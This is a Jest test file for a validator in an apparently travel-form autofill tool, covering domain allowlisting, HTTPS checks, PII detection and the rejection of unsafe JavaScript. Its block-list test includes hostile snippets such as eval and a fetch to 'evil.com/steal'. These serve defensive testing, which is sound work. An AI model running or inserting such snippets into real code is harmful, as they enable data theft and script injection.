/**
 * Tests for SubmissionValidator
 */

import { SubmissionValidator } from '@/utils/submissionValidator';
import { FilledForm } from '@/services/forms/formEngine';

describe('SubmissionValidator', () => {
  let validator: SubmissionValidator;

  beforeEach(() => {
    validator = new SubmissionValidator();
  });

  describe('validateURL', () => {
    it('should accept valid HTTPS government portal URLs', () => {
      const result = validator.validateURL('https://vjw-lp.digital.go.jp/en/');
      
      expect(result.isValid).toBe(true);
      expect(result.checks.secureConnection).toBe(true);
      expect(result.checks.validDomain).toBe(true);
    });

    it('should reject HTTP URLs (except localhost)', () => {
      const result = validator.validateURL('http://example.com/');
      
      expect(result.isValid).toBe(false);
      expect(result.checks.secureConnection).toBe(false);
      expect(result.errors).toContain('Only HTTPS URLs are allowed for government portals');
    });

    it('should accept HTTP localhost for development', () => {
      const result = validator.validateURL('http://localhost:3000/');
      
      expect(result.isValid).toBe(true);
      expect(result.checks.secureConnection).toBe(true);
      expect(result.warnings).toContain('Using HTTP on localhost (development only)');
    });

    it('should reject non-allowlisted domains', () => {
      const result = validator.validateURL('https://evil-site.com/');
      
      expect(result.isValid).toBe(false);
      expect(result.checks.validDomain).toBe(false);
      expect(result.errors).toContain('Domain not in allowlist: evil-site.com');
    });

    it('should detect PII in URL parameters', () => {
      const result = validator.validateURL('https://vjw-lp.digital.go.jp/en/?ssn=123-45-6789');
      
      expect(result.isValid).toBe(false);
      expect(result.checks.noPIILeakage).toBe(false);
      expect(result.errors).toContain('PII detected in URL parameters');
    });

    it('should handle invalid URLs gracefully', () => {
      const result = validator.validateURL('not-a-url');
      
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });
  });

  describe('validateJavaScript', () => {
    it('should accept safe JavaScript code', () => {
      const safeCode = `
        document.querySelector('#name').value = 'John Doe';
        document.querySelector('#submit').click();
      `;
      
      const result = validator.validateJavaScript(safeCode);
      expect(result.isValid).toBe(true);
    });

    it('should reject dangerous JavaScript patterns', () => {
      const dangerousPatterns = [
        'eval("malicious code")',
        'new Function("alert", "alert(1)")',
        'document.write("<script>alert(1)</script>")',
        'fetch("https://evil.com/steal")',
        'window.location = "https://evil.com"'
      ];

      for (const code of dangerousPatterns) {
        const result = validator.validateJavaScript(code);
        expect(result.isValid).toBe(false);
        expect(result.checks.noPIILeakage).toBe(false);
      }
    });

    it('should reject oversized JavaScript', () => {
      const largeCode = 'a'.repeat(100000); // 100KB
      
      const result = validator.validateJavaScript(largeCode);
      expect(result.isValid).toBe(false);
      expect(result.checks.dataWithinLimits).toBe(false);
    });

    it('should warn about potential PII patterns', () => {
      const codeWithPII = 'const ssn = "123-45-6789";';
      
      const result = validator.validateJavaScript(codeWithPII);
      expect(result.warnings.length).toBeGreaterThan(0);
    });
  });

  describe('validateSubmission', () => {
    const mockFilledForm: FilledForm = {
      countryCode: 'JPN',
      countryName: 'Japan',
      portalName: 'Visit Japan Web',
      portalUrl: 'https://vjw-lp.digital.go.jp/en/',
      sections: [
        {
          id: 'personal',
          title: 'Personal Information',
          fields: [
            {
              id: 'surname',
              label: 'Surname',
              type: 'text',
              required: true,
              currentValue: 'Doe',
              source: 'auto',
              needsUserInput: false,
              countrySpecific: false
            },
            {
              id: 'passportNumber',
              label: 'Passport Number',
              type: 'text',
              required: true,
              currentValue: 'A12345678',
              source: 'auto',
              needsUserInput: false,
              countrySpecific: false
            }
          ]
        }
      ],
      stats: {
        totalFields: 2,
        autoFilled: 2,
        userFilled: 0,
        remaining: 0,
        completionPercentage: 100
      }
    };

    it('should validate valid submission', async () => {
      const result = await validator.validateSubmission(mockFilledForm, 'JPN');
      
      expect(result.isValid).toBe(true);
      expect(result.checks.validDomain).toBe(true);
      expect(result.checks.secureConnection).toBe(true);
    });

    it('should reject submission with invalid domain', async () => {
      const invalidForm = {
        ...mockFilledForm,
        portalUrl: 'https://evil-site.com/'
      };
      
      const result = await validator.validateSubmission(invalidForm, 'JPN');
      
      expect(result.isValid).toBe(false);
      expect(result.checks.validDomain).toBe(false);
    });

    it('should validate Japan-specific requirements', async () => {
      const result = await validator.validateSubmission(mockFilledForm, 'JPN');
      
      expect(result.isValid).toBe(true);
    });

    it('should reject form missing required fields for Japan', async () => {
      const incompleteForm = {
        ...mockFilledForm,
        sections: [
          {
            id: 'personal',
            title: 'Personal Information',
            fields: [
              {
                id: 'surname',
                label: 'Surname',
                type: 'text' as const,
                required: true,
                currentValue: '', // Missing required value
                source: 'empty' as const,
                needsUserInput: true,
                countrySpecific: false
              }
            ]
          }
        ]
      };
      
      const result = await validator.validateSubmission(incompleteForm, 'JPN');
      
      expect(result.isValid).toBe(false);
    });
  });

  describe('utility methods', () => {
    it('should return allowed domains for specific country', () => {
      const domains = validator.getAllowedDomains('JPN');
      expect(domains).toContain('vjw-lp.digital.go.jp');
    });

    it('should return all allowed domains when no country specified', () => {
      const domains = validator.getAllowedDomains();
      expect(domains.length).toBeGreaterThan(0);
    });

    it('should check if field is allowed to contain PII', () => {
      expect(validator.isAllowedPIIField('passportNumber')).toBe(true);
      expect(validator.isAllowedPIIField('creditCard')).toBe(false);
    });

    it('should validate session data', () => {
      const validSessionData = {
        surname: 'Doe',
        passportNumber: 'A12345678'
      };
      
      const result = validator.validateSessionData(validSessionData);
      expect(result.isValid).toBe(true);
    });

    it('should reject session data with unauthorized PII', () => {
      const invalidSessionData = {
        surname: 'Doe',
        creditCard: '4111-1111-1111-1111' // Unauthorized PII
      };
      
      const result = validator.validateSessionData(invalidSessionData);
      expect(result.isValid).toBe(false);
      expect(result.checks.noPIILeakage).toBe(false);
    });
  });
});